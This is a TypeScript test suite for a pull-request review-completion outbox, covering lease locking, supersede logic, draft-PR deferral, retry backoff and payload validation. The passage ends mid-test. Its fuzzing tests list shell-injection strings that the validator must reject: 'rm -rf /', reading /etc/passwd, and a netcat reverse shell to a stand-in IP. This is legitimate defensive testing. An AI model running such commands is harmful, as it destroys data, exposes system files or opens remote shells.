import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { Pool } from 'pg';
import {
  PostgresReviewCompletionRepository,
  ReviewCompletionRecordInput,
} from '../../src/persistence/reviewCompletionRepository';
import {
  validateReviewCIRequestPayload,
  SCHEMA_VERSION_CI_REQUEST,
  ReviewCIRequestPayload,
} from '../../src/github/reviewCIRequest';
import {
  ReviewCompletionDeliveryEngine,
  CIRequestClient,
} from '../../src/k8s/reviewCompletionDeliveryEngine';

const TEST_SCHEMA = 'test_challenger_m2';
const DATABASE_URL = process.env.REVIEW_YETI_TEST_DATABASE_URL || 'postgres://localhost/postgres';

describe('Milestone 2 Empirical Challenger Stress Tests', () => {
  let pool: Pool;
  let repository: PostgresReviewCompletionRepository;

  beforeAll(async () => {
    pool = new Pool({
      connectionString: DATABASE_URL,
      max: 20, // Support concurrent worker clients
    });

    const client = await pool.connect();
    try {
      await client.query(`CREATE SCHEMA IF NOT EXISTS ${TEST_SCHEMA}`);
      await client.query(`SET search_path TO ${TEST_SCHEMA}, public`);
      await client.query(`
        CREATE TABLE IF NOT EXISTS ${TEST_SCHEMA}.review_completion_outbox (
          completion_id TEXT PRIMARY KEY,
          run_id TEXT NOT NULL,
          delivery_id TEXT,
          repository_id BIGINT NOT NULL,
          repository TEXT NOT NULL,
          pr_number INTEGER NOT NULL,
          base_sha TEXT NOT NULL,
          head_sha TEXT NOT NULL,
          attempt_id TEXT NOT NULL,
          policy_digest TEXT NOT NULL,
          validation_request_id TEXT UNIQUE NOT NULL,
          status TEXT NOT NULL CHECK (status IN ('pending', 'claimed', 'dispatched', 'completed', 'error', 'superseded', 'terminal')),
          draft_deferred BOOLEAN NOT NULL DEFAULT FALSE,
          verdict TEXT,
          conclusion TEXT,
          lease_owner TEXT,
          lease_expires_at TIMESTAMP WITH TIME ZONE,
          attempt INTEGER NOT NULL DEFAULT 0,
          available_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT CURRENT_TIMESTAMP,
          created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT CURRENT_TIMESTAMP,
          error_text TEXT
        )
      `);
      await client.query(`
        CREATE INDEX IF NOT EXISTS review_completion_claim_idx
          ON ${TEST_SCHEMA}.review_completion_outbox (status, available_at, lease_expires_at, draft_deferred)
      `);
      await client.query(`
        CREATE INDEX IF NOT EXISTS review_completion_pr_idx
          ON ${TEST_SCHEMA}.review_completion_outbox (repository_id, pr_number, head_sha)
      `);
      await client.query(`
        CREATE UNIQUE INDEX IF NOT EXISTS review_completion_val_req_idx
          ON ${TEST_SCHEMA}.review_completion_outbox (validation_request_id)
      `);
    } finally {
      client.release();
    }

    const schemaPool = {
      connect: async () => {
        const c = await pool.connect();
        await c.query(`SET search_path TO ${TEST_SCHEMA}, public`);
        return c;
      },
      query: async (text: string, values?: unknown[]) => {
        const c = await pool.connect();
        try {
          await c.query(`SET search_path TO ${TEST_SCHEMA}, public`);
          return await c.query(text, values);
        } finally {
          c.release();
        }
      },
    };

    repository = new PostgresReviewCompletionRepository(schemaPool);
  });

  afterAll(async () => {
    if (pool) {
      const client = await pool.connect();
      try {
        await client.query(`DROP SCHEMA IF EXISTS ${TEST_SCHEMA} CASCADE`);
      } finally {
        client.release();
      }
      await pool.end();
    }
  });

  beforeEach(async () => {
    const client = await pool.connect();
    try {
      await client.query(`TRUNCATE TABLE ${TEST_SCHEMA}.review_completion_outbox`);
    } finally {
      client.release();
    }
  });

  // =========================================================================
  // 1. Concurrency & Race Conditions
  // =========================================================================
  describe('Objective 1: Concurrency, CAS Locking, Leases & Supersede', () => {
    it('guarantees single-claim winner under high worker contention for a single record', async () => {
      const now = Date.now();
      await repository.recordCompletion({
        runId: 'run_single',
        repositoryId: 100,
        repository: 'calltelemetry/dashboard',
        prNumber: 10,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        attemptId: 'att-1',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: now,
      });

      const workerCount = 10;
      const leaseMs = 30_000;

      const claimPromises = Array.from({ length: workerCount }, (_, i) =>
        repository.claimNext(`worker-${i}`, now, leaseMs)
      );

      const claims = await Promise.all(claimPromises);
      const successfulClaims = claims.filter((c) => c !== null);
      const nullClaims = claims.filter((c) => c === null);

      expect(successfulClaims).toHaveLength(1);
      expect(nullClaims).toHaveLength(workerCount - 1);

      const winner = successfulClaims[0]!;
      expect(winner.attempt).toBe(1);
      expect(winner.leaseOwner).toMatch(/^worker-\d$/);

      const client = await pool.connect();
      try {
        const res = await client.query(`SELECT status, lease_owner, attempt FROM ${TEST_SCHEMA}.review_completion_outbox`);
        expect(res.rows).toHaveLength(1);
        expect(res.rows[0].status).toBe('claimed');
        expect(res.rows[0].lease_owner).toBe(winner.leaseOwner);
        expect(Number(res.rows[0].attempt)).toBe(1);
      } finally {
        client.release();
      }
    });

    it('distributes N records across M workers with zero duplicate claims', async () => {
      const recordCount = 5;
      const now = Date.now();
      for (let i = 0; i < recordCount; i++) {
        await repository.recordCompletion({
          runId: `run_multi_${i}`,
          repositoryId: 100,
          repository: 'calltelemetry/dashboard',
          prNumber: 10 + i,
          baseSha: 'a'.repeat(40),
          headSha: 'b'.repeat(40),
          attemptId: `att-${i}`,
          policyDigest: `sha256:${'c'.repeat(64)}`,
          status: 'pending',
          availableAt: now,
        });
      }

      const workerCount = 15;
      const leaseMs = 30_000;

      const claims = await Promise.all(
        Array.from({ length: workerCount }, (_, i) =>
          repository.claimNext(`worker-${i}`, now, leaseMs)
        )
      );

      const successfulClaims = claims.filter((c) => c !== null);
      expect(successfulClaims).toHaveLength(recordCount);

      const claimedIds = successfulClaims.map((c) => c!.completionId);
      const uniqueIds = new Set(claimedIds);
      expect(uniqueIds.size).toBe(recordCount);
    });

    it('reclaims expired leases after leaseExpiresAt passes and increments attempt count', async () => {
      const baseTime = Date.now();
      const leaseMs = 10_000;

      await repository.recordCompletion({
        runId: 'run_lease_test',
        repositoryId: 100,
        repository: 'calltelemetry/dashboard',
        prNumber: 20,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        attemptId: 'att-lease',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: baseTime,
      });

      // Worker 1 claims at baseTime
      const claim1 = await repository.claimNext('worker-1', baseTime, leaseMs);
      expect(claim1).not.toBeNull();
      expect(claim1!.leaseOwner).toBe('worker-1');
      expect(claim1!.attempt).toBe(1);

      // Worker 2 attempts claim while lease is active
      const claimActive = await repository.claimNext('worker-2', baseTime + 5_000, leaseMs);
      expect(claimActive).toBeNull();

      // Time passes lease expiration
      const claimExpired = await repository.claimNext('worker-2', baseTime + 11_000, leaseMs);
      expect(claimExpired).not.toBeNull();
      expect(claimExpired!.leaseOwner).toBe('worker-2');
      expect(claimExpired!.attempt).toBe(2);

      // Worker 1 tries to markDispatched after losing lease -> must fail
      const dispatchedByOld = await repository.markDispatched(claim1!.completionId, 'worker-1', baseTime + 12_000);
      expect(dispatchedByOld).toBe(false);

      // Worker 2 successfully marks dispatched
      const dispatchedByNew = await repository.markDispatched(claim1!.completionId, 'worker-2', baseTime + 16_000);
      expect(dispatchedByNew).toBe(true);
    });

    it('heartbeat successfully updates lease_expires_at and updated_at in PostgreSQL', async () => {
      const now = Date.now();
      await repository.recordCompletion({
        runId: 'run_heartbeat_bug',
        repositoryId: 100,
        repository: 'calltelemetry/dashboard',
        prNumber: 25,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        attemptId: 'att-hb',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: now,
      });

      await repository.claimNext('worker-hb', now, 30_000);

      const renewed = await repository.heartbeat('cpl_heartbeat_bug', 'worker-hb', now + 5_000, 30_000);
      expect(renewed).toBe(true);

      const client = await pool.connect();
      try {
        const res = await client.query(
          `SELECT lease_expires_at FROM ${TEST_SCHEMA}.review_completion_outbox WHERE completion_id = $1`,
          ['cpl_heartbeat_bug'],
        );
        expect(res.rows[0].lease_expires_at).toBeInstanceOf(Date);
        expect(res.rows[0].lease_expires_at.getTime()).toBe(now + 5_000 + 30_000);
      } finally {
        client.release();
      }
    });

    it('releaseForRetry successfully updates available_at, error_text, and reverts status to pending', async () => {
      const now = Date.now();
      await repository.recordCompletion({
        runId: 'run_retry_bug',
        repositoryId: 100,
        repository: 'calltelemetry/dashboard',
        prNumber: 26,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        attemptId: 'att-retry',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: now,
      });

      await repository.claimNext('worker-retry', now, 30_000);

      const released = await repository.releaseForRetry(
        'cpl_retry_bug',
        'worker-retry',
        now + 5_000,
        2_000,
        'transient error',
      );
      expect(released).toBe(true);

      const client = await pool.connect();
      try {
        const res = await client.query(
          `SELECT status, lease_owner, available_at, error_text FROM ${TEST_SCHEMA}.review_completion_outbox WHERE completion_id = $1`,
          ['cpl_retry_bug'],
        );
        expect(res.rows[0].status).toBe('pending');
        expect(res.rows[0].lease_owner).toBeNull();
        expect(res.rows[0].available_at).toBeInstanceOf(Date);
        expect(res.rows[0].available_at.getTime()).toBe(now + 5_000 + 2_000);
        expect(res.rows[0].error_text).toBe('transient error');
      } finally {
        client.release();
      }
    });

    it('supersedes older pending and claimed records when newer head arrives', async () => {
      const headOld = '1111111111111111111111111111111111111111';
      const headNew = '2222222222222222222222222222222222222222';
      const now = Date.now();

      // Pending record with old head
      const oldPending = await repository.recordCompletion({
        runId: 'run_old_pending',
        repositoryId: 500,
        repository: 'calltelemetry/dashboard',
        prNumber: 77,
        baseSha: 'a'.repeat(40),
        headSha: headOld,
        attemptId: 'att-old-pending',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: now,
      });

      // Claimed record with old head
      const oldClaimed = await repository.recordCompletion({
        runId: 'run_old_claimed',
        repositoryId: 500,
        repository: 'calltelemetry/dashboard',
        prNumber: 77,
        baseSha: 'a'.repeat(40),
        headSha: headOld,
        attemptId: 'att-old-claimed',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: now,
      });
      await repository.claimNext('worker-holding-old', now, 30_000);

      // Insert new head record
      await repository.recordCompletion({
        runId: 'run_new',
        repositoryId: 500,
        repository: 'calltelemetry/dashboard',
        prNumber: 77,
        baseSha: 'a'.repeat(40),
        headSha: headNew,
        attemptId: 'att-new',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: now,
      });

      // Invoke supersedeOlderHeads for headNew
      const count = await repository.supersedeOlderHeads(500, 77, headNew, now + 100);
      expect(count).toBe(2);

      // Verify that old records are now 'superseded' with null lease_owner
      const client = await pool.connect();
      try {
        const resOldPending = await client.query(
          `SELECT status, lease_owner FROM ${TEST_SCHEMA}.review_completion_outbox WHERE completion_id = $1`,
          [oldPending.completionId]
        );
        expect(resOldPending.rows[0].status).toBe('superseded');
        expect(resOldPending.rows[0].lease_owner).toBeNull();

        const resOldClaimed = await client.query(
          `SELECT status, lease_owner FROM ${TEST_SCHEMA}.review_completion_outbox WHERE completion_id = $1`,
          [oldClaimed.completionId]
        );
        expect(resOldClaimed.rows[0].status).toBe('superseded');
        expect(resOldClaimed.rows[0].lease_owner).toBeNull();
      } finally {
        client.release();
      }

      // Next claimNext() must claim headNew, NOT the superseded ones
      const nextClaim = await repository.claimNext('worker-next', now + 200, 30_000);
      expect(nextClaim).not.toBeNull();
      expect(nextClaim!.headSha).toBe(headNew);

      // Worker holding old claim cannot markDispatched
      const dispatchedOld = await repository.markDispatched(oldClaimed.completionId, 'worker-holding-old', now + 300);
      expect(dispatchedOld).toBe(false);
    });
  });

  // =========================================================================
  // 2. Draft PR Split Arrival
  // =========================================================================
  describe('Objective 2: Draft PR Split Arrival & Independence', () => {
    it('Scenario A: Review finishes on Draft PR (draft_deferred=true) -> skipped until markReady()', async () => {
      const now = Date.now();
      const headSha = '3'.repeat(40);

      const record = await repository.recordCompletion({
        runId: 'run_draft_pr',
        repositoryId: 999,
        repository: 'calltelemetry/dashboard',
        prNumber: 88,
        baseSha: 'a'.repeat(40),
        headSha,
        attemptId: 'att-draft',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        draftDeferred: true,
        availableAt: now,
      });

      expect(record.draftDeferred).toBe(true);

      // Delivery worker attempts to claim
      const initialClaim = await repository.claimNext('worker-draft', now, 30_000);
      expect(initialClaim).toBeNull();

      // PR is converted to ready_for_review
      const readyCount = await repository.markReady(999, 88, headSha, now + 500);
      expect(readyCount).toBe(1);

      // Delivery worker claims again -> now claimed!
      const postReadyClaim = await repository.claimNext('worker-draft', now + 600, 30_000);
      expect(postReadyClaim).not.toBeNull();
      expect(postReadyClaim!.completionId).toBe(record.completionId);
      expect(postReadyClaim!.prNumber).toBe(88);
    });

    it('Scenario B: PR marked ready before review finishes -> draft_deferred=false -> claimed immediately', async () => {
      const now = Date.now();
      const headSha = '4'.repeat(40);

      const record = await repository.recordCompletion({
        runId: 'run_ready_pr',
        repositoryId: 999,
        repository: 'calltelemetry/dashboard',
        prNumber: 89,
        baseSha: 'a'.repeat(40),
        headSha,
        attemptId: 'att-ready',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        draftDeferred: false,
        availableAt: now,
      });

      expect(record.draftDeferred).toBe(false);

      const claim = await repository.claimNext('worker-ready', now, 30_000);
      expect(claim).not.toBeNull();
      expect(claim!.completionId).toBe(record.completionId);
    });

    it('isolates markReady to target repository, PR number, and head SHA strictly', async () => {
      const now = Date.now();
      const shaA = 'a'.repeat(40);
      const shaB = 'b'.repeat(40);

      // PR 10 with shaA
      await repository.recordCompletion({
        runId: 'run_10_shaA',
        repositoryId: 100,
        repository: 'calltelemetry/dashboard',
        prNumber: 10,
        baseSha: '0'.repeat(40),
        headSha: shaA,
        attemptId: 'att-10-A',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        draftDeferred: true,
        availableAt: now,
      });

      // PR 10 with shaB
      await repository.recordCompletion({
        runId: 'run_10_shaB',
        repositoryId: 100,
        repository: 'calltelemetry/dashboard',
        prNumber: 10,
        baseSha: '0'.repeat(40),
        headSha: shaB,
        attemptId: 'att-10-B',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        draftDeferred: true,
        availableAt: now,
      });

      // PR 20 with shaA (different PR)
      await repository.recordCompletion({
        runId: 'run_20_shaA',
        repositoryId: 100,
        repository: 'calltelemetry/dashboard',
        prNumber: 20,
        baseSha: '0'.repeat(40),
        headSha: shaA,
        attemptId: 'att-20-A',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        draftDeferred: true,
        availableAt: now,
      });

      // Mark ready ONLY PR 10 shaB
      const updated = await repository.markReady(100, 10, shaB, now);
      expect(updated).toBe(1);

      // Verify only PR 10 shaB is claimable
      const claim1 = await repository.claimNext('worker-iso', now, 30_000);
      expect(claim1).not.toBeNull();
      expect(claim1!.prNumber).toBe(10);
      expect(claim1!.headSha).toBe(shaB);

      // Second claim should be null
      const claim2 = await repository.claimNext('worker-iso', now, 30_000);
      expect(claim2).toBeNull();
    });
  });

  // =========================================================================
  // 3. Payload Contract Fuzzing
  // =========================================================================
  describe('Objective 3: Payload Contract Fuzzing', () => {
    const validBase: ReviewCIRequestPayload = {
      schema_version: SCHEMA_VERSION_CI_REQUEST,
      repository_id: 12345,
      repository: 'calltelemetry/dashboard',
      pr_number: 42,
      base_sha: '1234567890abcdef1234567890abcdef12345678',
      head_sha: 'abcdef1234567890abcdef1234567890abcdef12',
      attempt_id: 'att-valid-123',
      policy_digest: `sha256:${'e'.repeat(64)}`,
      validation_request_id: 'validation-42-att-123',
    };

    it('rejects every possible missing field individually', () => {
      const requiredFields: Array<keyof ReviewCIRequestPayload> = [
        'schema_version',
        'repository_id',
        'repository',
        'pr_number',
        'base_sha',
        'head_sha',
        'attempt_id',
        'policy_digest',
        'validation_request_id',
      ];

      for (const field of requiredFields) {
        const payload = { ...validBase };
        delete (payload as any)[field];
        const res = validateReviewCIRequestPayload(payload);
        expect(res.valid).toBe(false);
        if (!res.valid) {
          expect(res.error).toContain(field);
        }
      }
    });

    it('rejects arbitrary extraneous and malicious injection fields', () => {
      const extraneousKeys = [
        'admin',
        'token',
        'command',
        '__proto__',
        'constructor',
        'payload',
        'extra_data',
        'auth_token',
      ];

      for (const key of extraneousKeys) {
        const payload = { ...validBase, [key]: 'malicious_content' };
        const res = validateReviewCIRequestPayload(payload);
        expect(res.valid).toBe(false);
        if (!res.valid) {
          expect(res.error).toContain(`Disallowed extraneous field in coordinate payload: ${key}`);
        }
      }
    });

    it('fuzzes commit SHAs with non-40-hex, casing, and injection strings', () => {
      const badShas = [
        '',
        '   ',
        'a'.repeat(39),
        'a'.repeat(41),
        'a'.repeat(64),
        'A'.repeat(40),
        '0123456789abcdefABCDEF0123456789abcdef01',
        'g'.repeat(40),
        'z'.repeat(40),
        '$(rm -rf /)' + 'a'.repeat(29),
        '; cat /etc/passwd ;' + 'a'.repeat(21),
        '1234567890\n123456789012345678901234567890',
      ];

      for (const sha of badShas) {
        const resBase = validateReviewCIRequestPayload({ ...validBase, base_sha: sha });
        expect(resBase.valid).toBe(false);

        const resHead = validateReviewCIRequestPayload({ ...validBase, head_sha: sha });
        expect(resHead.valid).toBe(false);
      }
    });

    it('fuzzes shell injection metacharacters across identifiers', () => {
      const metachars = [';', '&', '|', '`', '$', '<', '>', '\\'];
      const attackVectors = [
        '$(rm -rf /)',
        '; reboot ;',
        '| nc -e /bin/sh 10.0.0.1 4444',
        '& ping -c 3 attacker.com',
        '> /tmp/pwned',
        '`id`',
        '\\n\\r evil',
      ];

      for (const attack of attackVectors) {
        const resAttempt = validateReviewCIRequestPayload({
          ...validBase,
          attempt_id: `run_${attack}`,
        });
        expect(resAttempt.valid).toBe(false);

        const resValReq = validateReviewCIRequestPayload({
          ...validBase,
          validation_request_id: `val_${attack}`,
        });
        expect(resValReq.valid).toBe(false);
      }

      for (const char of metachars) {
        expect(
          validateReviewCIRequestPayload({ ...validBase, attempt_id: `valid${char}test` }).valid
        ).toBe(false);
        expect(
          validateReviewCIRequestPayload({ ...validBase, validation_request_id: `valid${char}test` }).valid
        ).toBe(false);
      }
    });

    it('fuzzes non-integer and boundary numbers for repository_id and pr_number', () => {
      const badNumbers = [
        0,
        -1,
        -100,
        0.5,
        1.0001,
        NaN,
        Infinity,
        -Infinity,
        '42' as any,
        null as any,
        undefined as any,
        {} as any,
        [] as any,
      ];

      for (const val of badNumbers) {
        expect(validateReviewCIRequestPayload({ ...validBase, repository_id: val }).valid).toBe(false);
        expect(validateReviewCIRequestPayload({ ...validBase, pr_number: val }).valid).toBe(false);
      }
    });

    it('fuzzes repository coordinate formatting', () => {
      const badRepos = [
        '',
        '   ',
        'onlyname',
        'too/many/parts/here',
        'spaces in / repo',
        '/leading/slash',
        'trailing/slash/',
        'repo;injection/name',
        'repo|pipe/name',
        'repo$(evil)/name',
      ];

      for (const repo of badRepos) {
        expect(validateReviewCIRequestPayload({ ...validBase, repository: repo }).valid).toBe(false);
      }
    });

    it('fuzzes policy_digest format', () => {
      const badDigests = [
        '',
        'sha256:',
        'sha256:' + 'a'.repeat(63),
        'sha256:' + 'a'.repeat(65),
        'sha256:' + 'A'.repeat(64),
        'sha256:' + 'g'.repeat(64),
        'sha512:' + 'a'.repeat(128),
        'md5:' + 'a'.repeat(32),
        'a'.repeat(64),
      ];

      for (const digest of badDigests) {
        expect(validateReviewCIRequestPayload({ ...validBase, policy_digest: digest }).valid).toBe(false);
      }
    });
  });

  // =========================================================================
  // 4. Retry & Backoff Math
  // =========================================================================
  describe('Objective 4: Retry & Backoff Math Bounds & Error Transitions', () => {
    it('computes exact bounded exponential backoff across attempts', async () => {
      const baseDelay = 1_000;
      const maxDelay = 60_000;
      const maxAttempts = 5;

      const testMatrix = [
        { attempt: 1, expectedDelay: 1_000 },
        { attempt: 2, expectedDelay: 2_000 },
        { attempt: 3, expectedDelay: 4_000 },
        { attempt: 4, expectedDelay: 8_000 },
      ];

      for (const { attempt, expectedDelay } of testMatrix) {
        const repoMock = {
          claimNext: vi.fn(async () => ({
            completionId: `cpl_retry_${attempt}`,
            runId: 'run_1',
            repositoryId: 100,
            repository: 'calltelemetry/dashboard',
            prNumber: 42,
            baseSha: 'a'.repeat(40),
            headSha: 'b'.repeat(40),
            attemptId: 'att-1',
            policyDigest: `sha256:${'c'.repeat(64)}`,
            validationRequestId: `val-42-${attempt}`,
            verdict: 'SHIP',
            conclusion: 'success',
            attempt,
            leaseOwner: 'worker-engine',
            leaseExpiresAt: Date.now() + 30_000,
          })),
          markDispatched: vi.fn(async () => true),
          releaseForRetry: vi.fn(async () => true),
          markError: vi.fn(async () => true),
        };

        const engine = new ReviewCompletionDeliveryEngine({
          repository: repoMock,
          clientFactory: async () => ({
            emitCIRequest: async () => {
              const err = new Error('HTTP 503 Service Unavailable');
              (err as any).status = 503;
              throw err;
            },
          }),
          workerId: 'worker-engine',
          baseRetryDelayMs: baseDelay,
          maxRetryDelayMs: maxDelay,
          maxAttempts,
        });

        const outcome = await engine.runOnce();
        expect(outcome.status).toBe('retry');
        if (outcome.status === 'retry') {
          expect(outcome.delayMs).toBe(expectedDelay);
          expect(outcome.attempt).toBe(attempt);
        }

        expect(repoMock.releaseForRetry).toHaveBeenCalledWith(
          `cpl_retry_${attempt}`,
          'worker-engine',
          expect.any(Number),
          expectedDelay,
          expect.stringContaining('503'),
        );
      }
    });

    it('caps backoff delay strictly at maxRetryDelayMs when exponential growth exceeds ceiling', async () => {
      const baseDelay = 10_000;
      const maxDelay = 25_000;
      const maxAttempts = 10;

      const repoMock = {
        claimNext: vi.fn(async () => ({
          completionId: 'cpl_cap_test',
          runId: 'run_cap',
          repositoryId: 100,
          repository: 'calltelemetry/dashboard',
          prNumber: 42,
          baseSha: 'a'.repeat(40),
          headSha: 'b'.repeat(40),
          attemptId: 'att-cap',
          policyDigest: `sha256:${'c'.repeat(64)}`,
          validationRequestId: 'val-cap',
          verdict: 'SHIP',
          conclusion: 'success',
          attempt: 3,
          leaseOwner: 'worker-engine',
          leaseExpiresAt: Date.now() + 30_000,
        })),
        markDispatched: vi.fn(async () => true),
        releaseForRetry: vi.fn(async () => true),
        markError: vi.fn(async () => true),
      };

      const engine = new ReviewCompletionDeliveryEngine({
        repository: repoMock,
        clientFactory: async () => ({
          emitCIRequest: async () => {
            const err = new Error('HTTP 502 Bad Gateway');
            (err as any).status = 502;
            throw err;
          },
        }),
        workerId: 'worker-engine',
        baseRetryDelayMs: baseDelay,
        maxRetryDelayMs: maxDelay,
        maxAttempts,
      });

      const outcome = await engine.runOnce();
      expect(outcome.status).toBe('retry');
      if (outcome.status === 'retry') {
        expect(outcome.delayMs).toBe(25_000);
      }
      expect(repoMock.releaseForRetry).toHaveBeenCalledWith(
        'cpl_cap_test',
        'worker-engine',
        expect.any(Number),
        25_000,
        expect.any(String),
      );
    });

    it('transitions to markError(reason: max_retries) when attempt >= maxAttempts', async () => {
      const repoMock = {
        claimNext: vi.fn(async () => ({
          completionId: 'cpl_max_retries',
          runId: 'run_max',
          repositoryId: 100,
          repository: 'calltelemetry/dashboard',
          prNumber: 42,
          baseSha: 'a'.repeat(40),
          headSha: 'b'.repeat(40),
          attemptId: 'att-max',
          policyDigest: `sha256:${'c'.repeat(64)}`,
          validationRequestId: 'val-max',
          verdict: 'SHIP',
          conclusion: 'success',
          attempt: 5,
          leaseOwner: 'worker-engine',
          leaseExpiresAt: Date.now() + 30_000,
        })),
        markDispatched: vi.fn(async () => true),
        releaseForRetry: vi.fn(async () => true),
        markError: vi.fn(async () => true),
      };

      const engine = new ReviewCompletionDeliveryEngine({
        repository: repoMock,
        clientFactory: async () => ({
          emitCIRequest: async () => {
            const err = new Error('HTTP 500 Internal Server Error');
            (err as any).status = 500;
            throw err;
          },
        }),
        workerId: 'worker-engine',
        maxAttempts: 5,
      });

      const outcome = await engine.runOnce();
      expect(outcome.status).toBe('error');
      if (outcome.status === 'error') {
        expect(outcome.reason).toBe('max_retries');
      }
      expect(repoMock.releaseForRetry).not.toHaveBeenCalled();
      expect(repoMock.markError).toHaveBeenCalledWith(
        'cpl_max_retries',
        'worker-engine',
        expect.any(Number),
        expect.stringContaining('Max retry attempts (5) exceeded'),
      );
    });

    it('immediately aborts with error on HTTP 401 and HTTP 403 without burning retries', async () => {
      for (const status of [401, 403]) {
        const repoMock = {
          claimNext: vi.fn(async () => ({
            completionId: `cpl_auth_${status}`,
            runId: 'run_auth',
            repositoryId: 100,
            repository: 'calltelemetry/dashboard',
            prNumber: 42,
            baseSha: 'a'.repeat(40),
            headSha: 'b'.repeat(40),
            attemptId: 'att-auth',
            policyDigest: `sha256:${'c'.repeat(64)}`,
            validationRequestId: `val-auth-${status}`,
            verdict: 'SHIP',
            conclusion: 'success',
            attempt: 1,
            leaseOwner: 'worker-engine',
            leaseExpiresAt: Date.now() + 30_000,
          })),
          markDispatched: vi.fn(async () => true),
          releaseForRetry: vi.fn(async () => true),
          markError: vi.fn(async () => true),
        };

        const engine = new ReviewCompletionDeliveryEngine({
          repository: repoMock,
          clientFactory: async () => ({
            emitCIRequest: async () => {
              const err = new Error(`HTTP ${status} Forbidden`);
              (err as any).status = status;
              throw err;
            },
          }),
          workerId: 'worker-engine',
          maxAttempts: 5,
        });

        const outcome = await engine.runOnce();
        expect(outcome.status).toBe('error');
        if (outcome.status === 'error') {
          expect(outcome.reason).toBe('auth');
        }
        expect(repoMock.releaseForRetry).not.toHaveBeenCalled();
        expect(repoMock.markError).toHaveBeenCalledWith(
          `cpl_auth_${status}`,
          'worker-engine',
          expect.any(Number),
          expect.stringContaining(`HTTP ${status}`),
        );
      }
    });

    it('immediately aborts with error on HTTP 404 Not Found without burning retries', async () => {
      const repoMock = {
        claimNext: vi.fn(async () => ({
          completionId: 'cpl_404',
          runId: 'run_404',
          repositoryId: 100,
          repository: 'calltelemetry/dashboard',
          prNumber: 42,
          baseSha: 'a'.repeat(40),
          headSha: 'b'.repeat(40),
          attemptId: 'att-404',
          policyDigest: `sha256:${'c'.repeat(64)}`,
          validationRequestId: 'val-404',
          verdict: 'SHIP',
          conclusion: 'success',
          attempt: 1,
          leaseOwner: 'worker-engine',
          leaseExpiresAt: Date.now() + 30_000,
        })),
        markDispatched: vi.fn(async () => true),
        releaseForRetry: vi.fn(async () => true),
        markError: vi.fn(async () => true),
      };

      const engine = new ReviewCompletionDeliveryEngine({
        repository: repoMock,
        clientFactory: async () => ({
          emitCIRequest: async () => {
            const err = new Error('HTTP 404 Not Found');
            (err as any).status = 404;
            throw err;
          },
        }),
        workerId: 'worker-engine',
        maxAttempts: 5,
      });

      const outcome = await engine.runOnce();
      expect(outcome.status).toBe('error');
      if (outcome.status === 'error') {
        expect(outcome.reason).toBe('not_found');
      }
      expect(repoMock.releaseForRetry).not.toHaveBeenCalled();
      expect(repoMock.markError).toHaveBeenCalledWith(
        'cpl_404',
        'worker-engine',
        expect.any(Number),
        expect.stringContaining('HTTP 404'),
      );
    });
  });

  // =========================================================================
  // 5. Stress Test / Adversarial Edge Case: Stale Worker markError Overwrite
  // =========================================================================
  describe('Adversarial Deep Dive: Stale Worker Race against Dispatched Record', () => {
    it('prevents stale worker from overwriting already-dispatched record to error status', async () => {
      const baseTime = Date.now();
      const leaseMs = 5_000;

      // 1. Insert record
      const record = await repository.recordCompletion({
        runId: 'run_stale_test',
        repositoryId: 777,
        repository: 'calltelemetry/dashboard',
        prNumber: 55,
        baseSha: 'a'.repeat(40),
        headSha: 'b'.repeat(40),
        attemptId: 'att-stale',
        policyDigest: `sha256:${'c'.repeat(64)}`,
        status: 'pending',
        availableAt: baseTime,
      });

      // 2. Worker 1 claims at baseTime
      const claim1 = await repository.claimNext('worker-1', baseTime, leaseMs);
      expect(claim1).not.toBeNull();

      // 3. Time advances past Worker 1 lease expiry (baseTime + 6_000)
      // Worker 2 claims the expired lease
      const claim2 = await repository.claimNext('worker-2', baseTime + 6_000, leaseMs);
      expect(claim2).not.toBeNull();
      expect(claim2!.leaseOwner).toBe('worker-2');

      // 4. Worker 2 successfully dispatches and marks dispatched
      const dispatched2 = await repository.markDispatched(record.completionId, 'worker-2', baseTime + 7_000);
      expect(dispatched2).toBe(true);

      // Verify row in DB is now 'dispatched' with lease_owner = NULL
      const client = await pool.connect();
      try {
        const res = await client.query(
          `SELECT status, lease_owner FROM ${TEST_SCHEMA}.review_completion_outbox WHERE completion_id = $1`,
          [record.completionId]
        );
        expect(res.rows[0].status).toBe('dispatched');
        expect(res.rows[0].lease_owner).toBeNull();
      } finally {
        client.release();
      }

      // 5. Now Worker 1 (which lost its lease) wakes up after timeout and calls markError
      const markedErrorByWorker1 = await repository.markError(
        record.completionId,
        'worker-1',
        baseTime + 10_000,
        'Stale worker network timeout',
      );

      // Verify that markError was safely rejected
      expect(markedErrorByWorker1).toBe(false);

      const client2 = await pool.connect();
      try {
        const res = await client2.query(
          `SELECT status, lease_owner, error_text FROM ${TEST_SCHEMA}.review_completion_outbox WHERE completion_id = $1`,
          [record.completionId]
        );
        // REGRESSION PREVENTED: status remains dispatched!
        expect(res.rows[0].status).toBe('dispatched');
        expect(res.rows[0].error_text).toBeNull();
      } finally {
        client2.release();
      }
    });

    it('prevents stale worker from overwriting superseded record to error status', async () => {
      const baseTime = Date.now();
      const leaseMs = 10_000;
      const headOld = '1'.repeat(40);
      const headNew = '2'.repeat(40);

      // 1. Insert record for old head
      const oldRecord = await repository.recordCompletion({
